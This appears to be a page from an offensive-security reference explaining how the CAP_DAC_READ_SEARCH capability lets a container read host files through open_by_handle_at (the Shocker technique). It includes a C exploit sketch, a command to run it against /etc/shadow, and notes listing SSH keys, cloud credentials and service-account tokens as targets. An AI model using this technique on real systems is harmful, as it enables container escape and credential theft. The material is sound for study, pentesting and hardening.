---
title: "CAP_DAC_READ_SEARCH: reading any host file by brute-forcing inode handles"
order: 4
description: "CAP_DAC_READ_SEARCH bypasses file read and directory search permission checks and, more importantly, authorises open_by_handle_at. The Shocker technique uses it to open files by raw inode handle rather than by path, escaping the container's chroot/mount view to read arbitrary host files such as /etc/shadow."
keywords:
  - cap_dac_read_search
  - open_by_handle_at
  - shocker
  - file_handle
  - container escape
---

# CAP_DAC_READ_SEARCH

`CAP_DAC_READ_SEARCH` bypasses discretionary read and directory-search checks, but its escape value comes from a side effect: it authorises `open_by_handle_at(2)`. That syscall opens a file from an opaque `file_handle` that encodes an inode number, not from a path, so it is not confined to the container's mount namespace or root. By guessing the handle of a file on the host filesystem and opening it, an attacker reads host files the container was never meant to see. This is the Shocker technique.

Confirm the capability:

```bash
capsh --print | grep -o cap_dac_read_search
grep CapEff /proc/self/status          # bit 2 set
```

## Shocker: open by handle

A `file_handle` for most Linux filesystems is small: a handle type, and a payload of the 32-bit inode number plus a generation count. The root inode of a typical ext4/xfs host filesystem is `2`. The attacker needs any open file descriptor that lives on the host filesystem to use as the `mount_fd` argument; a bind-mounted host file such as `/etc/hostname` or `/.dockerenv` serves that purpose.

```c
// shocker-style core (error handling omitted)
struct my_handle { struct file_handle fh; unsigned char data[8]; };

int mount_fd = open("/etc/hostname", O_RDONLY);   // a fd on the host fs
struct my_handle h = { .fh = { .handle_bytes = 8, .handle_type = 1 } };
*(uint32_t*)h.data = 2;          // inode 2 == filesystem root
*(uint32_t*)(h.data+4) = 0;      // generation

int root = open_by_handle_at(mount_fd, &h.fh, O_RDONLY);  // host "/"
// now walk from the host root: readdir, resolve /etc, brute inode of shadow
```

Because directories are themselves inodes, you open the host root by its known inode `2`, read its directory entries to find `etc`, open that, and descend to `shadow`. Where names are not readable, brute-force the inode number: the handle payload is only a few bytes, so iterating candidate inodes and attempting `open_by_handle_at` recovers target files quickly.

```bash
# compile and run a shocker build against a mounted host fd
gcc shocker.c -o shocker && ./shocker /etc/hostname /etc/shadow
```

## Exploitation notes

- This is a read primitive, not code execution. Its highest-value targets are `/etc/shadow` for offline cracking, private keys under `/root/.ssh` and `/home/*/.ssh`, cloud credential files, and the kubelet or service-account tokens on a node.
- The `mount_fd` must reside on the same filesystem as the target. Docker bind-mounts like `/etc/resolv.conf`, `/etc/hostname`, and `/etc/hosts` typically sit on the host root filesystem, which is exactly where the sensitive files are.
- Pair the recovered `/etc/shadow` with offline cracking, or chain a recovered private key into an interactive host session. For write access combine with [CAP_DAC_OVERRIDE](cap-dac-override.md).

## Tools

- [shocker.c (original PoC by Sebastian Krahmer)](https://github.com/gabrtv/shocker)

## References

- [man 2 open_by_handle_at](https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html)
- [HackTricks: CAP_DAC_READ_SEARCH](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_read_search)
